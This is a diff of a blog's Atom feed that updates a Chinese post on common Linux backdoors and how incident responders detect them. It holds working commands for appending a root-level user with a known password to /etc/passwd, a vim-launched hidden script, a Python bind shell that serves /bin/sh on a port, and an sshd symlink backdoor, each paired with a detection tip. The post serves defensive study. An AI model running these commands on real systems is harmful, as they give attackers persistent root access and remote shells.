@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2019-03-09T08:16:47.007Z</updated>
+  <updated>2019-03-09T11:19:32.616Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -20,15 +20,31 @@
     <link href="http://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/"/>
     <id>http://kevien.github.io/2019/02/16/linux常见backdoor及排查技术/</id>
     <published>2019-02-16T13:38:54.000Z</published>
-    <updated>2019-03-09T08:16:47.007Z</updated>
+    <updated>2019-03-09T11:19:32.616Z</updated>
     
     <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">原文已发布至先知平台</div><div class="line">https://xz.aliyun.com/t/4090</div></pre></td></tr></table></figure>
 <h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2019/02/16/linux常见backdoor及排查技术/backdooropen.jpg" alt=""></p>
 <ul>
 <li>最近遇到一些和后门相关的技术，所以就把之前的linux backdoor相关笔记重新整理和学习了一下。在这里做一下记录，后续有时间整理一下windows backdoor方面的技术。</li>
 <li>在服务器被入侵后进行应急响应无非通过文件排查、网络排查、进程排查、系统信息排查等方法进行入侵排查。下面就一些常见技巧以及公开的工具进行剖析介绍。</li>
-<li><p>现在有一些公司在发现入侵之后直接重装系统，那么基本所有的后门就无法发挥权限维持的作用了，但作为一个安全从业人员还是需要对一些后门有一个基本的了解。</p>
-<h2 id="常见技巧"><a href="#常见技巧" class="headerlink" title="常见技巧"></a>常见技巧</h2><h3 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#enter the mal script directory 、execute the script and then remove the script</div><div class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py</div></pre></td></tr></table></figure>
+<li>现在有一些公司在发现入侵之后直接重装系统，那么基本所有的后门就无法发挥权限维持的作用了，但作为一个安全从业人员还是需要对一些后门有一个基本的了解。<h2 id="常见技巧"><a href="#常见技巧" class="headerlink" title="常见技巧"></a>常见技巧</h2><h3 id="添加后门用户"><a href="#添加后门用户" class="headerlink" title="添加后门用户"></a>添加后门用户</h3></li>
+<li>/etc/passwd这个文件包含了系统所有的用户名、ID、登录的shell等信息,这个文件是以分号分隔开的，依次是登录名、密码、用户ID、组ID，用户名、用户的根目录以及登录的shell，其中密码处可以是x(代表加密，存放在/etc/shadow文件中)，也可以直接是加密后的密文，此外用户id为0代表用户会是root的权限，这个时候我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。</li>
+<li><p>关于密码加密我们可以使用下面的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#密码M0rk</div><div class="line">xxx@ubuntu:~/Desktop$ perl -e &apos;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&apos;</div><div class="line">AAhmo1jgYI0HE</div></pre></td></tr></table></figure>
+</li>
+<li><p>所以我们最终想要在passwd文件中的条目是这个样子的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash</div></pre></td></tr></table></figure>
+</li>
+<li><p>append the backdoor to passwd file</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2019/02/16/linux常见backdoor及排查技术/passwdbackdoor.png" alt=""></p>
+<ul>
+<li>优点：简单</li>
+<li>缺点：易被检测到</li>
+<li><p>排查：检查/etc/passwd文件是否有异常</p>
+<h3 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#enter the mal script directory 、execute the script and then remove the script</div><div class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py</div></pre></td></tr></table></figure>
 </li>
 <li><p>此方法适用于安装了vim且安装了python扩展(绝大部分默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如python版本的正向后门监听11端口。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</div><div class="line">from socket import *</div><div class="line">import subprocess</div><div class="line">import os, threading, sys, time</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">        server=socket(AF_INET,SOCK_STREAM)</div><div class="line">        server.bind((&apos;0.0.0.0&apos;,11))</div><div class="line">        server.listen(5)</div><div class="line">        print &apos;waiting for connect&apos;</div><div class="line">        talk, addr = server.accept()</div><div class="line">        print &apos;connect from&apos;,addr</div><div class="line">        proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</div><div class="line">                stdout=talk, stderr=talk, shell=True)</div></pre></td></tr></table></figure>
@@ -58,7 +74,7 @@
 <ul>
 <li>优点：改动较小</li>
 <li>缺点：易被检测到</li>
-<li>排查：通过排查shell的配置文件或者alias命令即可发现，例如~/.bashrc和~/.bash_profile文件查看是否有恶意的alias问题。(注意bash_profile是在登录的shell执行的，bashrc是在非登录的shell执行,即如果你只是想每次在登录的时候让它去执行，这个时候你可以把你的命令写在.bash_profile,如果你想每次打开一个新的终端的时候都去执行，那么应该把命令写在.bashrc中)<h3 id="常见sshd后门"><a href="#常见sshd后门" class="headerlink" title="常见sshd后门"></a>常见sshd后门</h3></li>
+<li>排查：通过排查shell的配置文件或者alias命令即可发现，例如~/.bashrc和~/.bash_profile文件查看是否有恶意的alias问题。(注意bash_profile是在登录shell执行的，bashrc是在非登录shell执行,即如果你只是想每次在登录的时候让它去执行，这个时候你可以把你的命令写在.bash_profile,如果你想每次打开一个新的终端的时候都去执行，那么应该把命令写在.bashrc中)<h3 id="常见sshd后门"><a href="#常见sshd后门" class="headerlink" title="常见sshd后门"></a>常见sshd后门</h3></li>
 <li><p>一种是建立sshd的软连接方法，开启其它的端口例如</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ln -sf /usr/sbin/sshd /home/su</div><div class="line">/home/su -oport=2222</div></pre></td></tr></table></figure>
 </li>
